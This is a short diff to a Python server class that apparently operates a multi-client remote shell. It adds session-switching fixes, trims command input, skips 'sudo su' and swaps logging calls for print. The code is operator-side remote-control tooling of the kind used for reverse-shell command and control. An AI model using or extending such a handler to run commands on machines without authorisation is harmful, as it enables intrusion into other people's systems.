@@ -65,9 +65,10 @@ class Server:
                 print(f"[+] Connection closed with {ip} ")
                 clientsocket.close()
                 self.ip_to_socket_map.pop(ip)
-                for ip in self.ip_to_socket_map:
-                    self.current_Client = ip
-                    return
+                if self.current_Client == ip:
+                    for ip in self.ip_to_socket_map:
+                        self.current_Client = ip
+                        return
 
         except Exception as ex:
             print(f"[-]Remove Error :{str(ex)}")
@@ -85,7 +86,10 @@ class Server:
             try:
                 # getting the user command
                 print(f"Shell~{self.current_Client}:> ", end="")
-                command = input()
+                command = (input()).strip()
+
+                if command.lower() == "sudo su":
+                    continue
 
                 if command.strip() == "":
                     continue
@@ -172,17 +176,17 @@ class Server:
         try:
             ip = input("[+] Please Enter the IP or -1 to exit:")
             if ip == "":
-                logterminal.write(f"[+] PLEASE RETRY LATER AGAIN")
+                print(f"[+] PLEASE RETRY LATER AGAIN")
                 return
             if ip == "-1":
-                logterminal.write(f"[+] SWITCH SESSION CANCELLED")
+                print(f"[+] SWITCH SESSION CANCELLED")
                 return
             if self.ip_to_socket_map.get(ip) == None:
-                logterminal.write(f"[+] THE IP IS NOT ACTIVE")
+                print(f"[+] THE IP IS NOT ACTIVE")
                 return
             self.current_Client = ip.strip()
         except Exception as ex:
-            logterminal.write(f"[+] ERROR WHILE SWITCHING SESSION : {str(ex)}")
+            print(f"[+] ERROR WHILE SWITCHING SESSION : {str(ex)}")
 
     # message Generator
     def generate_Message(self, msg):
